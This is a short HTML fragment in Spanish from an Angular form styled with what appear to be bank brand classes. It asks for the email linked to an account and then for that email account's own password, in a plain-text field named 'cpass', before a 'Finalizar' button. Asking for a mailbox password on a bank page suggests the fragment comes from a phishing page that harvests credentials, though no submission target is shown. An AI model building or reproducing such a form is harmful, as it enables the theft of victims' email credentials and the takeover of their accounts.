...
<h2>Ingresa el correo asociado a tu cuenta:
  <br>
  <br>
</h2>

<label _ngcontent-otb-c140="" for="userName">Correo Electrónico
<span _ngcontent-otb-c140="" class="bhd-red-1">*</span>
</label><span _ngcontent-otb-c140=""
class="">

<input _ngcontent-otb-c140="" type="email" pinputtext="" name="email" formcontrolname="username" tooltipposition="bottom" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></span>

</div>

<div _ngcontent-otb-c140="" class="p-field p-col-10"><label _ngcontent-otb-c140="" for="password">Contraseña del email <span _ngcontent-otb-c140="" class="bhd-red-1">*</span></label>
<span
_ngcontent-otb-c140="" class="">

<input _ngcontent-otb-c140="" type="text" pinputtext=""
formcontrolname="password" name="cpass" class="p-inputtext p-component p-element form-control password-mask ng-untouched ng-pristine ng-invalid" required></span>
...
<p-button _ngcontent-otb-c140="" type="submit" iconpos="right" class="p-element"><button pripple="" class="p-ripple p-element bhd-btn-primary p-button p-component" type="submit"><!----><!----><span class="p-button-label ng-star-inserted">Finalizar</span><!----><!----><span class="p-ink"></span></button></p-button>
</div>
